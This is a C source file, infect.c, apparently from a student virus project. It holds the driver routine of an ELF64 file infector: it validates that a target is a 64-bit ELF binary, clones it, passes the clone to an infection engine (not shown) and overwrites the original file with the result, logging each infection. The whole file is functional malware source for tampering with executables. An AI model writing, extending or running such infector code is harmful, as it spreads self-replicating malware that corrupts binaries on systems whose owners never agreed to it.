/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
/*   Updated: 2019/12/27 01:44:00 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "accessors.h"
#include "errors.h"
#include "log.h"
#include "syscall.h"
#include "utils.h"
#include "virus.h"

static bool	is_elf64(const char *file)
{
	Elf64_Ehdr	hdr;
	int		fd = sys_open(file, O_RDONLY);

	if (fd < 0) return errors(ERR_SYS, _ERR_OPEN_FAILED);

	if (sys_read(fd, &hdr, sizeof(Elf64_Ehdr)) < (ssize_t)sizeof(Elf64_Ehdr))
	{
		sys_close(fd);
		return errors(ERR_USAGE, _ERR_NOT_ELF);
	}

	if (memcmp(hdr.e_ident, (char[4]){ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3}, SELFMAG) != 0 // wrong Magic
	|| hdr.e_ident[EI_CLASS] != ELFCLASS64        // not 64bit
	|| hdr.e_ident[EI_DATA] != ELFDATA2LSB        // not little endian
	|| hdr.e_entry == 0                           // no entry point
	|| hdr.e_phoff == 0                           // no program hdr table
	|| hdr.e_shoff == 0)                          // no section hdr table
	{
		sys_close(fd);
		return errors(ERR_USAGE, _ERR_NOT_ELF);
	}

	sys_close(fd);
	return true;
}

inline bool	infect(const char *file)
{
	struct safe_ptr	original_ref = {.ptr = NULL};
	struct safe_ptr	clone_ref = {.ptr = NULL};

	log_try_infecting(file);

	if (!is_elf64(file)
	|| !init_original_safe(&original_ref, file)
	|| !init_clone_safe(&clone_ref, original_ref.size)
	|| !infection_engine(clone_ref, original_ref)
	|| !write_file(clone_ref, file))
	{
		free_accessor(&original_ref);
		free_accessor(&clone_ref);
		return errors(ERR_THROW, _ERR_INFECT);
	}

	free_accessor(&original_ref);
	free_accessor(&clone_ref);

	log_success();

	return true;
}
